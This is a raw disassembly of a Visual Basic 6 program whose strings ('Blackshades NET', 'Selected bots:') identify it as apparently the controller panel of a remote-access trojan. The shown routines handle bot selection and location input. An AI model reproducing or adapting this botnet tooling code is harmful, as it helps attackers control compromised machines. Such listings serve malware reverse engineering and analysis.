0087EA06: lea eax, var_6C
0087EA09: push eax
0087EA0A: lea eax, var_5C
0087EA0D: push eax
0087EA0E: mov eax, var_000000D0
0087EA14: mov eax, [eax]
0087EA16: push var_000000D0
0087EA1C: call [eax+20h]
0087EA1F: fclex 
0087EA21: mov var_000000D4, eax
0087EA27: cmp var_000000D4, 00000000h
0087EA2E: jnl 87EA50h
0087EA30: push 00000020h
0087EA32: push 00440E28h
0087EA37: push var_000000D0
0087EA3D: push var_000000D4
0087EA43: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087EA48: mov var_000001C0, eax
0087EA4E: jmp 87EA57h
0087EA50: and var_000001C0, 00000000h
0087EA57: lea ecx, var_30
0087EA5A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087EA5F: lea eax, var_0000008C
0087EA65: push eax
0087EA66: lea eax, var_7C
0087EA69: push eax
0087EA6A: lea eax, var_6C
0087EA6D: push eax
0087EA6E: lea eax, var_5C
0087EA71: push eax
0087EA72: push 00000004h
0087EA74: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0087EA79: add esp, 00000014h
0087EA7C: mov var_04, 0000000Fh
0087EA83: jmp 0087E197h
0087EA88: mov var_04, 00000010h
0087EA8F: mov eax, [ebp+08h]
0087EA92: mov eax, [eax]
0087EA94: push [ebp+08h]
0087EA97: call [eax+00000324h]
0087EA9D: push eax
0087EA9E: lea eax, var_30
0087EAA1: push eax
0087EAA2: call 00410A84h ; Set (object)
0087EAA7: mov var_000000C8, eax
0087EAAD: push 00000000h
0087EAAF: mov eax, var_000000C8
0087EAB5: mov eax, [eax]
0087EAB7: push var_000000C8
0087EABD: call [eax+54h]
0087EAC0: fclex 
0087EAC2: mov var_000000CC, eax
0087EAC8: cmp var_000000CC, 00000000h
0087EACF: jnl 87EAF1h
0087EAD1: push 00000054h
0087EAD3: push 004425E4h
0087EAD8: push var_000000C8
0087EADE: push var_000000CC
0087EAE4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087EAE9: mov var_000001C4, eax
0087EAEF: jmp 87EAF8h
0087EAF1: and var_000001C4, 00000000h
0087EAF8: lea ecx, var_30
0087EAFB: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087EB00: mov var_04, 00000011h
0087EB07: mov eax, [ebp+08h]
0087EB0A: mov eax, [eax]
0087EB0C: push [ebp+08h]
0087EB0F: call [eax+00000300h]
0087EB15: push eax
0087EB16: lea eax, var_30
0087EB19: push eax
0087EB1A: call 00410A84h ; Set (object)
0087EB1F: mov var_000000D0, eax
0087EB25: mov eax, [ebp+08h]
0087EB28: cmp [eax+000000A0h], 00000000h
0087EB2F: jnz 87EB54h
0087EB31: mov eax, [ebp+08h]
0087EB34: add eax, 000000A0h
0087EB39: push eax
0087EB3A: push 00440E38h
0087EB3F: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0087EB44: mov eax, [ebp+08h]
0087EB47: add eax, 000000A0h
0087EB4C: mov var_000001C8, eax
0087EB52: jmp 87EB62h
0087EB54: mov eax, [ebp+08h]
0087EB57: add eax, 000000A0h
0087EB5C: mov var_000001C8, eax
0087EB62: mov eax, var_000001C8
0087EB68: mov eax, [eax]
0087EB6A: mov var_000000C8, eax
0087EB70: lea eax, var_000000C4
0087EB76: push eax
0087EB77: mov eax, var_000000C8
0087EB7D: mov eax, [eax]
0087EB7F: push var_000000C8
0087EB85: call [eax+24h]
0087EB88: fclex 
0087EB8A: mov var_000000CC, eax
0087EB90: cmp var_000000CC, 00000000h
0087EB97: jnl 87EBB9h
0087EB99: push 00000024h
0087EB9B: push 00440E28h
0087EBA0: push var_000000C8
0087EBA6: push var_000000CC
0087EBAC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087EBB1: mov var_000001CC, eax
0087EBB7: jmp 87EBC0h
0087EBB9: and var_000001CC, 00000000h
0087EBC0: push 00457C58h ; Selected bots:
0087EBC5: push var_000000C4
0087EBCB: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
0087EBD0: mov edx, eax
0087EBD2: lea ecx, var_28
0087EBD5: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0087EBDA: push eax
0087EBDB: call 00410A18h ; &
0087EBE0: mov edx, eax
0087EBE2: lea ecx, var_2C
0087EBE5: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0087EBEA: push eax
0087EBEB: mov eax, var_000000D0
0087EBF1: mov eax, [eax]
0087EBF3: push var_000000D0
0087EBF9: call [eax+74h]
0087EBFC: fclex 
0087EBFE: mov var_000000D4, eax
0087EC04: cmp var_000000D4, 00000000h
0087EC0B: jnl 87EC2Dh
0087EC0D: push 00000074h
0087EC0F: push 00447A20h
0087EC14: push var_000000D0
0087EC1A: push var_000000D4
0087EC20: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087EC25: mov var_000001D0, eax
0087EC2B: jmp 87EC34h
0087EC2D: and var_000001D0, 00000000h
0087EC34: lea eax, var_2C
0087EC37: push eax
0087EC38: lea eax, var_28
0087EC3B: push eax
0087EC3C: push 00000002h
0087EC3E: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0087EC43: add esp, 0000000Ch
0087EC46: lea ecx, var_30
0087EC49: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087EC4E: mov var_04, 00000012h
0087EC55: mov eax, [ebp+08h]
0087EC58: mov eax, [eax]
0087EC5A: push [ebp+08h]
0087EC5D: call [eax+00000300h]
0087EC63: push eax
0087EC64: lea eax, var_30
0087EC67: push eax
0087EC68: call 00410A84h ; Set (object)
0087EC6D: mov var_000000C8, eax
0087EC73: push FFFFFFFFh
0087EC75: mov eax, var_000000C8
0087EC7B: mov eax, [eax]
0087EC7D: push var_000000C8
0087EC83: call [eax+5Ch]
0087EC86: fclex 
0087EC88: mov var_000000CC, eax
0087EC8E: cmp var_000000CC, 00000000h
0087EC95: jnl 87ECB7h
0087EC97: push 0000005Ch
0087EC99: push 00447A20h
0087EC9E: push var_000000C8
0087ECA4: push var_000000CC
0087ECAA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087ECAF: mov var_000001D4, eax
0087ECB5: jmp 87ECBEh
0087ECB7: and var_000001D4, 00000000h
0087ECBE: lea ecx, var_30
0087ECC1: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087ECC6: mov var_04, 00000013h
0087ECCD: mov eax, [ebp+08h]
0087ECD0: mov eax, [eax]
0087ECD2: push [ebp+08h]
0087ECD5: call [eax+00000320h]
0087ECDB: push eax
0087ECDC: lea eax, var_30
0087ECDF: push eax
0087ECE0: call 00410A84h ; Set (object)
0087ECE5: mov var_000000C8, eax
0087ECEB: lea eax, var_000000C0
0087ECF1: push eax
0087ECF2: mov eax, var_000000C8
0087ECF8: mov eax, [eax]
0087ECFA: push var_000000C8
0087ED00: call [eax+48h]
0087ED03: fclex 
0087ED05: mov var_000000CC, eax
0087ED0B: cmp var_000000CC, 00000000h
0087ED12: jnl 87ED34h
0087ED14: push 00000048h
0087ED16: push 00440DE8h
0087ED1B: push var_000000C8
0087ED21: push var_000000CC
0087ED27: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087ED2C: mov var_000001D8, eax
0087ED32: jmp 87ED3Bh
0087ED34: and var_000001D8, 00000000h
0087ED3B: movsx eax, word ptr var_000000C0
0087ED42: mov var_00000100, eax
0087ED48: mov var_000000FC, 00000001h
0087ED52: and var_24, 00000000h
0087ED56: lea ecx, var_30
0087ED59: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087ED5E: jmp 87ED72h
0087ED60: mov eax, var_24
0087ED63: add eax, var_000000FC
0087ED69: jo 0087EEFDh
0087ED6F: mov var_24, eax
0087ED72: mov eax, var_24
0087ED75: cmp eax, var_00000100
0087ED7B: jnle 0087EE74h
0087ED81: mov var_04, 00000014h
0087ED88: mov eax, [ebp+08h]
0087ED8B: mov eax, [eax]
0087ED8D: push [ebp+08h]
0087ED90: call [eax+00000320h]
0087ED96: push eax
0087ED97: lea eax, var_30
0087ED9A: push eax
0087ED9B: call 00410A84h ; Set (object)
0087EDA0: mov var_000000C8, eax
0087EDA6: lea eax, var_34
0087EDA9: push eax
0087EDAA: mov ecx, var_24
0087EDAD: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087EDB2: push eax
0087EDB3: mov eax, var_000000C8
0087EDB9: mov eax, [eax]
0087EDBB: push var_000000C8
0087EDC1: call [eax+40h]
0087EDC4: fclex 
0087EDC6: mov var_000000CC, eax
0087EDCC: cmp var_000000CC, 00000000h
0087EDD3: jnl 87EDF5h
0087EDD5: push 00000040h
0087EDD7: push 00440DE8h
0087EDDC: push var_000000C8
0087EDE2: push var_000000CC
0087EDE8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087EDED: mov var_000001DC, eax
0087EDF3: jmp 87EDFCh
0087EDF5: and var_000001DC, 00000000h
0087EDFC: mov eax, var_34
0087EDFF: mov var_000000D0, eax
0087EE05: push 00000000h
0087EE07: mov eax, var_000000D0
0087EE0D: mov eax, [eax]
0087EE0F: push var_000000D0
0087EE15: call [eax+00000084h]
0087EE1B: fclex 
0087EE1D: mov var_000000D4, eax
0087EE23: cmp var_000000D4, 00000000h
0087EE2A: jnl 87EE4Fh
0087EE2C: push 00000084h
0087EE31: push 00456A8Ch
0087EE36: push var_000000D0
0087EE3C: push var_000000D4
0087EE42: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087EE47: mov var_000001E0, eax
0087EE4D: jmp 87EE56h
0087EE4F: and var_000001E0, 00000000h
0087EE56: lea eax, var_34
0087EE59: push eax
0087EE5A: lea eax, var_30
0087EE5D: push eax
0087EE5E: push 00000002h
0087EE60: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087EE65: add esp, 0000000Ch
0087EE68: mov var_04, 00000015h
0087EE6F: jmp 0087ED60h
0087EE74: mov var_10, 00000000h
0087EE7B: wait 
0087EE7C: push 0087EEDEh
0087EE81: jmp 87EEDDh
0087EE83: lea eax, var_2C
0087EE86: push eax
0087EE87: lea eax, var_28
0087EE8A: push eax
0087EE8B: push 00000002h
0087EE8D: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0087EE92: add esp, 0000000Ch
0087EE95: lea eax, var_4C
0087EE98: push eax
0087EE99: lea eax, var_48
0087EE9C: push eax
0087EE9D: lea eax, var_44
0087EEA0: push eax
0087EEA1: lea eax, var_40
0087EEA4: push eax
0087EEA5: lea eax, var_3C
0087EEA8: push eax
0087EEA9: lea eax, var_38
0087EEAC: push eax
0087EEAD: lea eax, var_34
0087EEB0: push eax
0087EEB1: lea eax, var_30
0087EEB4: push eax
0087EEB5: push 00000008h
0087EEB7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087EEBC: add esp, 00000024h
0087EEBF: lea eax, var_0000008C
0087EEC5: push eax
0087EEC6: lea eax, var_7C
0087EEC9: push eax
0087EECA: lea eax, var_6C
0087EECD: push eax
0087EECE: lea eax, var_5C
0087EED1: push eax
0087EED2: push 00000004h
0087EED4: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0087EED9: add esp, 00000014h
0087EEDC: ret 
End Sub

Private sub Form__879A7F
00879A7F: push ebp
00879A80: mov ebp, esp
00879A82: sub esp, 00000014h
00879A85: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00879A8A: mov eax, fs:[00h]
00879A90: push eax
00879A91: mov fs:[00000000h], esp
00879A98: mov eax, 00000244h
00879A9D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00879AA2: push ebx
00879AA3: push esi
00879AA4: push edi
00879AA5: mov var_14, esp
00879AA8: mov var_10, 0040D780h
00879AAF: mov eax, [ebp+08h]
00879AB2: and eax, 00000001h
00879AB5: mov var_0C, eax
00879AB8: mov eax, [ebp+08h]
00879ABB: and al, FEh
00879ABD: mov [ebp+08h], eax
00879AC0: mov var_08, 00000000h
00879AC7: mov eax, [ebp+08h]
00879ACA: mov eax, [eax]
00879ACC: push [ebp+08h]
00879ACF: call [eax+04h]
00879AD2: push 00000001h
00879AD4: call 00410A60h ; On Error ...
00879AD9: mov eax, [ebp+08h]
00879ADC: mov eax, [eax]
00879ADE: push [ebp+08h]
00879AE1: call [eax+0000030Ch]
00879AE7: push eax
00879AE8: lea eax, var_34
00879AEB: push eax
00879AEC: call 00410A84h ; Set (object)
00879AF1: mov var_00000134, eax
00879AF7: lea eax, var_00000120
00879AFD: push eax
00879AFE: mov eax, var_00000134
00879B04: mov eax, [eax]
00879B06: push var_00000134
00879B0C: call [eax+48h]
00879B0F: fclex 
00879B11: mov var_00000138, eax
00879B17: cmp var_00000138, 00000000h
00879B1E: jnl 879B40h
00879B20: push 00000048h
00879B22: push 00440DE8h
00879B27: push var_00000134
00879B2D: push var_00000138
00879B33: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00879B38: mov var_00000170, eax
00879B3E: jmp 879B47h
00879B40: and var_00000170, 00000000h
00879B47: xor eax, eax
00879B49: cmp word ptr var_00000120, 0000h
00879B51: setz al
00879B54: neg eax
00879B56: mov var_0000013C, ax
00879B5D: lea ecx, var_34
00879B60: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00879B65: movsx eax, word ptr var_0000013C
00879B6C: test eax, eax
00879B6E: jz 0087A349h
00879B74: cmp [008F2010h], 00000000h
00879B7B: jnz 879B98h
00879B7D: push 008F2010h
00879B82: push 00433984h
00879B87: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00879B8C: mov var_00000174, 008F2010h
00879B96: jmp 879BA2h
00879B98: mov var_00000174, 008F2010h
00879BA2: mov eax, var_00000174
00879BA8: mov eax, [eax]
00879BAA: mov ecx, var_00000174
00879BB0: mov ecx, [ecx]
00879BB2: mov ecx, [ecx]
00879BB4: push eax
00879BB5: call [ecx+00000380h]
00879BBB: push eax
00879BBC: lea eax, var_34
00879BBF: push eax
00879BC0: call 00410A84h ; Set (object)
00879BC5: mov var_00000134, eax
00879BCB: lea eax, var_38
00879BCE: push eax
00879BCF: push 00000001h
00879BD1: mov eax, var_00000134
00879BD7: mov eax, [eax]
00879BD9: push var_00000134
00879BDF: call [eax+40h]
00879BE2: fclex 
00879BE4: mov var_00000138, eax
00879BEA: cmp var_00000138, 00000000h
00879BF1: jnl 879C13h
00879BF3: push 00000040h
00879BF5: push 00440DE8h
00879BFA: push var_00000134
00879C00: push var_00000138
00879C06: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00879C0B: mov var_00000178, eax
00879C11: jmp 879C1Ah
00879C13: and var_00000178, 00000000h
00879C1A: mov eax, var_38
00879C1D: mov var_0000013C, eax
00879C23: lea eax, var_00000120
00879C29: push eax
00879C2A: mov eax, var_0000013C
00879C30: mov eax, [eax]
00879C32: push var_0000013C
00879C38: call [eax+000000E0h]
00879C3E: fclex 
00879C40: mov var_00000140, eax
00879C46: cmp var_00000140, 00000000h
00879C4D: jnl 879C72h
00879C4F: push 000000E0h
00879C54: push 00440DF8h
00879C59: push var_0000013C
00879C5F: push var_00000140
00879C65: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00879C6A: mov var_0000017C, eax
00879C70: jmp 879C79h
00879C72: and var_0000017C, 00000000h
00879C79: xor eax, eax
00879C7B: cmp word ptr var_00000120, 0001h
00879C83: setz al
00879C86: neg eax
00879C88: mov var_00000144, ax
00879C8F: lea eax, var_38
00879C92: push eax
00879C93: lea eax, var_34
00879C96: push eax
00879C97: push 00000002h
00879C99: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00879C9E: add esp, 0000000Ch
00879CA1: movsx eax, word ptr var_00000144
00879CA8: test eax, eax
00879CAA: jz 00879E9Bh
00879CB0: cmp [008F2010h], 00000000h
00879CB7: jnz 879CD4h
00879CB9: push 008F2010h
00879CBE: push 00433984h
00879CC3: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00879CC8: mov var_00000180, 008F2010h
00879CD2: jmp 879CDEh
00879CD4: mov var_00000180, 008F2010h
00879CDE: mov eax, var_00000180
00879CE4: mov eax, [eax]
00879CE6: mov var_00000134, eax
00879CEC: lea eax, var_2C
00879CEF: push eax
00879CF0: mov eax, var_00000134
00879CF6: mov eax, [eax]
00879CF8: push var_00000134
00879CFE: call [eax+00000710h]
00879D04: fclex 
00879D06: mov var_00000138, eax
00879D0C: cmp var_00000138, 00000000h
00879D13: jnl 879D38h
00879D15: push 00000710h
00879D1A: push 0043DD6Ch
00879D1F: push var_00000134
00879D25: push var_00000138
00879D2B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00879D30: mov var_00000184, eax
00879D36: jmp 879D3Fh
00879D38: and var_00000184, 00000000h
00879D3F: mov var_000000B4, 004413D8h
00879D49: mov var_000000BC, 00000008h
00879D53: lea edx, var_000000BC
00879D59: lea ecx, var_4C
00879D5C: call 004109E2h ; msvbvm60.dll.__vbaVarDup
00879D61: push 00000000h
00879D63: push 00000002h
00879D65: lea eax, var_4C
00879D68: push eax
00879D69: push var_2C
00879D6C: lea eax, var_5C
00879D6F: push eax
00879D70: call 0041094Ch ; arg_1 = Split(arg_2, arg_3, arg_4, arg_5)
00879D75: lea eax, var_5C
00879D78: push eax
00879D79: push 00002008h
00879D7E: call 0041088Ch ; msvbvm60.dll.__vbaAryVar
00879D83: mov var_00000124, eax
00879D89: lea eax, var_00000124
00879D8F: push eax
00879D90: lea eax, var_28
00879D93: push eax
00879D94: call 00410892h ; msvbvm60.dll.__vbaAryCopy
00879D99: lea ecx, var_2C
00879D9C: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00879DA1: lea eax, var_5C
00879DA4: push eax
00879DA5: lea eax, var_4C
00879DA8: push eax
00879DA9: push 00000002h
00879DAB: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00879DB0: add esp, 0000000Ch
00879DB3: push 00000000h
00879DB5: push var_28
00879DB8: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00879DBD: push [eax]
00879DBF: push 00442930h
00879DC4: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00879DC9: mov esi, eax
00879DCB: neg esi
00879DCD: sbb esi, esi
00879DCF: neg esi
00879DD1: push 00000001h
00879DD3: push var_28
00879DD6: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00879DDB: push [eax]
00879DDD: push 00442930h
00879DE2: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00879DE7: neg eax
00879DE9: sbb eax, eax
00879DEB: neg eax
00879DED: or esi, eax
00879DEF: test esi, esi
00879DF1: jnz 879DF8h
00879DF3: jmp 00879E9Bh
00879DF8: and var_0000012C, 00000000h
00879DFF: and var_00000128, 00000000h
00879E06: push 00000001h
00879E08: push var_28
00879E0B: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00879E10: push [eax]
00879E12: call 00410A0Ch ; msvbvm60.dll.__vbaI4Str
00879E17: mov var_00000124, eax
00879E1D: lea eax, var_00000130
00879E23: push eax
00879E24: lea eax, var_0000012C
00879E2A: push eax
00879E2B: lea eax, var_00000128
00879E31: push eax
00879E32: lea eax, var_00000124
00879E38: push eax
00879E39: push 00000000h
00879E3B: push var_28
00879E3E: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00879E43: push [eax]
00879E45: call 00410A0Ch ; msvbvm60.dll.__vbaI4Str
00879E4A: push eax
00879E4B: push 00457BE8h ; Blackshades NET
00879E50: push 00000002h
00879E52: mov eax, [ebp+08h]
00879E55: mov eax, [eax]
00879E57: push [ebp+08h]
00879E5A: call [eax+000006FCh]
00879E60: mov var_00000134, eax
00879E66: cmp var_00000134, 00000000h
00879E6D: jnl 879E8Fh
00879E6F: push 000006FCh
00879E74: push 00441844h
00879E79: push [ebp+08h]
00879E7C: push var_00000134
00879E82: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00879E87: mov var_00000188, eax
00879E8D: jmp 879E96h
00879E8F: and var_00000188, 00000000h
00879E96: jmp 0087A349h
00879E9B: cmp word ptr [008F202Eh], FFFFh
00879EA3: jnz 879EAAh
00879EA5: jmp 0087A349h
00879EAA: push 00000000h
00879EAC: push 00000001h
00879EAE: push 00000001h
00879EB0: push 00000008h
00879EB2: lea eax, var_28
00879EB5: push eax
00879EB6: push 00000004h
00879EB8: push 00000180h
00879EBD: call 00410946h ; ReDim
00879EC2: add esp, 0000001Ch
00879EC5: mov var_000000A4, 80020004h
00879ECF: mov var_000000AC, 0000000Ah
00879ED9: mov var_00000094, 80020004h
00879EE3: mov var_0000009C, 0000000Ah
00879EED: mov var_00000084, 80020004h
00879EF7: mov var_0000008C, 0000000Ah
00879F01: mov var_74, 80020004h
00879F08: mov var_7C, 0000000Ah
00879F0F: mov var_64, 80020004h
00879F16: mov var_6C, 0000000Ah
00879F1D: mov var_54, 80020004h
00879F24: mov var_5C, 0000000Ah
00879F2B: mov var_000000B4, 00457B68h ; Enter your longitude position
00879F35: mov var_000000BC, 00000008h
00879F3F: lea edx, var_000000BC
00879F45: lea ecx, var_4C
00879F48: call 004109E2h ; msvbvm60.dll.__vbaVarDup
00879F4D: lea eax, var_000000AC
00879F53: push eax
00879F54: lea eax, var_0000009C
00879F5A: push eax
00879F5B: lea eax, var_0000008C
00879F61: push eax
00879F62: lea eax, var_7C
00879F65: push eax
00879F66: lea eax, var_6C
00879F69: push eax
00879F6A: lea eax, var_5C
00879F6D: push eax
00879F6E: lea eax, var_4C
00879F71: push eax
00879F72: call 00410994h ; InputBox
00879F77: mov edx, eax
00879F79: lea ecx, var_2C
00879F7C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00879F81: push eax
00879F82: call 004109DCh ; Val(arg_1)
00879F87: push ecx
00879F88: push ecx
00879F89: fstp real8 ptr [esp]
00879F8C: call 00410790h ; msvbvm60.dll.__vbaStrR8
00879F91: mov edx, eax
00879F93: lea ecx, var_30
00879F96: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00879F9B: mov esi, eax
00879F9D: push 00000000h
00879F9F: push var_28
00879FA2: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00879FA7: mov ecx, eax
00879FA9: mov edx, esi
00879FAB: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00879FB0: lea eax, var_30
00879FB3: push eax
00879FB4: lea eax, var_2C
00879FB7: push eax
00879FB8: push 00000002h
00879FBA: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00879FBF: add esp, 0000000Ch
00879FC2: lea eax, var_000000AC
00879FC8: push eax
00879FC9: lea eax, var_0000009C
00879FCF: push eax
00879FD0: lea eax, var_0000008C
00879FD6: push eax
00879FD7: lea eax, var_7C
00879FDA: push eax
00879FDB: lea eax, var_6C
00879FDE: push eax
00879FDF: lea eax, var_5C
00879FE2: push eax
00879FE3: lea eax, var_4C
00879FE6: push eax
00879FE7: push 00000007h
00879FE9: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00879FEE: add esp, 00000020h
00879FF1: push 00000000h
00879FF3: push var_28
00879FF6: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00879FFB: push [eax]
00879FFD: call 004109DCh ; Val(arg_1)
0087A002: call 004109D6h ; msvbvm60.dll.__vbaFpR8
0087A007: fcomp real8 ptr [00401770h]
0087A00D: fstsw ax
0087A00F: sahf 
0087A010: jnz 0087A0B8h
0087A016: or word ptr [008F202Eh], FFFFh
0087A01E: cmp [008F529Ch], 00000000h
0087A025: jnz 87A042h
0087A027: push 008F529Ch
0087A02C: push 00440F2Ch
0087A031: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0087A036: mov var_0000018C, 008F529Ch
0087A040: jmp 87A04Ch
0087A042: mov var_0000018C, 008F529Ch
0087A04C: mov eax, var_0000018C
0087A052: mov eax, [eax]
0087A054: mov var_00000134, eax
0087A05A: push [ebp+08h]
0087A05D: lea eax, var_34
0087A060: push eax
0087A061: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
0087A066: push eax
0087A067: mov eax, var_00000134
0087A06D: mov eax, [eax]
0087A06F: push var_00000134
0087A075: call [eax+10h]
0087A078: fclex 
0087A07A: mov var_00000138, eax
0087A080: cmp var_00000138, 00000000h
0087A087: jnl 87A0A9h
0087A089: push 00000010h
0087A08B: push 00440F1Ch
0087A090: push var_00000134
0087A096: push var_00000138
0087A09C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A0A1: mov var_00000190, eax
0087A0A7: jmp 87A0B0h
0087A0A9: and var_00000190, 00000000h
0087A0B0: lea ecx, var_34
0087A0B3: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087A0B8: mov var_000000A4, 80020004h
0087A0C2: mov var_000000AC, 0000000Ah
0087A0CC: mov var_00000094, 80020004h
0087A0D6: mov var_0000009C, 0000000Ah
0087A0E0: mov var_00000084, 80020004h
0087A0EA: mov var_0000008C, 0000000Ah
0087A0F4: mov var_74, 80020004h
0087A0FB: mov var_7C, 0000000Ah
0087A102: mov var_64, 80020004h
0087A109: mov var_6C, 0000000Ah
0087A110: mov var_54, 80020004h
0087A117: mov var_5C, 0000000Ah
0087A11E: mov var_000000B4, 00457BA8h ; Enter your latitude position
0087A128: mov var_000000BC, 00000008h
0087A132: lea edx, var_000000BC
0087A138: lea ecx, var_4C
0087A13B: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0087A140: lea eax, var_000000AC
0087A146: push eax
0087A147: lea eax, var_0000009C
0087A14D: push eax
0087A14E: lea eax, var_0000008C
0087A154: push eax
0087A155: lea eax, var_7C
0087A158: push eax
0087A159: lea eax, var_6C
0087A15C: push eax
0087A15D: lea eax, var_5C
0087A160: push eax
0087A161: lea eax, var_4C
0087A164: push eax
0087A165: call 00410994h ; InputBox
0087A16A: mov edx, eax
0087A16C: lea ecx, var_2C
0087A16F: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0087A174: push eax
0087A175: call 004109DCh ; Val(arg_1)
0087A17A: push ecx
0087A17B: push ecx
0087A17C: fstp real8 ptr [esp]
0087A17F: call 00410790h ; msvbvm60.dll.__vbaStrR8
0087A184: mov edx, eax
0087A186: lea ecx, var_30
0087A189: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0087A18E: mov esi, eax
0087A190: push 00000001h
0087A192: push var_28
0087A195: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0087A19A: mov ecx, eax
0087A19C: mov edx, esi
0087A19E: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0087A1A3: lea eax, var_30
0087A1A6: push eax
0087A1A7: lea eax, var_2C
0087A1AA: push eax
0087A1AB: push 00000002h
0087A1AD: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0087A1B2: add esp, 0000000Ch
0087A1B5: lea eax, var_000000AC
0087A1BB: push eax
0087A1BC: lea eax, var_0000009C
0087A1C2: push eax
0087A1C3: lea eax, var_0000008C
0087A1C9: push eax
0087A1CA: lea eax, var_7C
0087A1CD: push eax
0087A1CE: lea eax, var_6C
0087A1D1: push eax
0087A1D2: lea eax, var_5C
0087A1D5: push eax
0087A1D6: lea eax, var_4C
0087A1D9: push eax
0087A1DA: push 00000007h
0087A1DC: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0087A1E1: add esp, 00000020h
0087A1E4: push 00000001h
0087A1E6: push var_28
0087A1E9: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0087A1EE: push [eax]
0087A1F0: call 004109DCh ; Val(arg_1)
0087A1F5: call 004109D6h ; msvbvm60.dll.__vbaFpR8
0087A1FA: fcomp real8 ptr [00401770h]
0087A200: fstsw ax
0087A202: sahf 
0087A203: jnz 0087A2ABh
0087A209: or word ptr [008F202Eh], FFFFh
0087A211: cmp [008F529Ch], 00000000h
0087A218: jnz 87A235h
0087A21A: push 008F529Ch
0087A21F: push 00440F2Ch
0087A224: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0087A229: mov var_00000194, 008F529Ch
0087A233: jmp 87A23Fh
0087A235: mov var_00000194, 008F529Ch
0087A23F: mov eax, var_00000194
0087A245: mov eax, [eax]
0087A247: mov var_00000134, eax
0087A24D: push [ebp+08h]
0087A250: lea eax, var_34
0087A253: push eax
0087A254: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
0087A259: push eax
0087A25A: mov eax, var_00000134
0087A260: mov eax, [eax]
0087A262: push var_00000134
0087A268: call [eax+10h]
0087A26B: fclex 
0087A26D: mov var_00000138, eax
0087A273: cmp var_00000138, 00000000h
0087A27A: jnl 87A29Ch
0087A27C: push 00000010h
0087A27E: push 00440F1Ch
0087A283: push var_00000134
0087A289: push var_00000138
0087A28F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A294: mov var_00000198, eax
0087A29A: jmp 87A2A3h
0087A29C: and var_00000198, 00000000h
0087A2A3: lea ecx, var_34
0087A2A6: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087A2AB: and var_0000012C, 00000000h
0087A2B2: and var_00000128, 00000000h
0087A2B9: push 00000001h
0087A2BB: push var_28
0087A2BE: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0087A2C3: push [eax]
0087A2C5: call 00410A0Ch ; msvbvm60.dll.__vbaI4Str
0087A2CA: mov var_00000124, eax
0087A2D0: lea eax, var_00000130
0087A2D6: push eax
0087A2D7: lea eax, var_0000012C
0087A2DD: push eax
0087A2DE: lea eax, var_00000128
0087A2E4: push eax
0087A2E5: lea eax, var_00000124
0087A2EB: push eax
0087A2EC: push 00000000h
0087A2EE: push var_28
0087A2F1: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0087A2F6: push [eax]
